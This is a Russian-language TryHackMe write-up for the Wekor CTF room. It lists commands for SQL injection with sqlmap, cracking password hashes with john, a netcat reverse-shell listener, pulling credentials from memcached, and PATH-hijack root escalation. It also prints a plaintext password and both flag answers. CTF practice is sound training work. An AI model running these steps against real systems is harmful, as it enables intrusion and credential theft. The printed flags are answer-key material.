[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Wekor](https://tryhackme.com/r/room/wekorra) 

Всего 2 задания:
## Задание 1
Привет всем! Эта коробка — просто небольшой CTF, который я недавно подготовил. Надеюсь, вам понравится, так как я 
впервые создаю что-то подобное!

Данный CTF в первую очередь ориентирован на перечисление, лучшее понимание сервисов и нестандартное мышление для 
некоторых частей этой машины.

Не стесняйтесь задавать любые вопросы... Ничего страшного, если в некоторых частях коробки вы запутаетесь ;)

Небольшое примечание: пожалуйста, используйте домен: "wekor.thm", так как он может пригодиться позже в поле ;)

### Ответьте на вопросы ниже
Разверните Машину!
```commandline
Ответ не нужен
```

## Задание 2
Время отправлять флаги :)
### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
echo "<IP> wekor.thm" | sudo tee -a /etc/hosts
for i in `curl -s http://wekor.thm/robots.txt | grep Disallow | cut -d " " -f2`;do echo $i;curl -I http://wekor.thm$i;echo "---";done
curl -s http://wekor.thm/comingreallysoon/
sqlmap -r it_cart_coupon.xml --dump-all --threads=10
ll
tree wordpress
cat wp_users.csv
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
echo "<IP> site.wekor.thm" | sudo tee -a /etc/hosts
admin: Administrator
wp_eagle: Subscriber
wp_jeffrey: Subscriber
wp_yura: Administrator

nc -nlvp 4444
echo "stats items" | nc -vn -w 1 127.0.0.1 11211
echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211
echo "get username" | nc -vn -w 1 127.0.0.1 11211
echo "get password" | nc -vn -w 1 127.0.0.1 11211
Orka:OrkAiSC00L24/7$
su Orka
Password: OrkAiSC00L24/7$
cat /home/Orka/user.txt
```
```commandline
1a26a6d51c0172400add0e297608dec6
```
Что такое корневой флаг?
```commandline
sudo -l
./bitcoin
echo $PATH
ls -la /usr/sbin/ | head
cat > /usr/sbin/python << EOF
#!/bin/bash
/bin/bash
EOF

chmod +x /usr/sbin/python
sudo /home/Orka/Desktop/bitcoin
20
cat /root/root.txt
```
```commandline
f4e788f87cc3afaecbaf0f0fe9ae6ad7
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)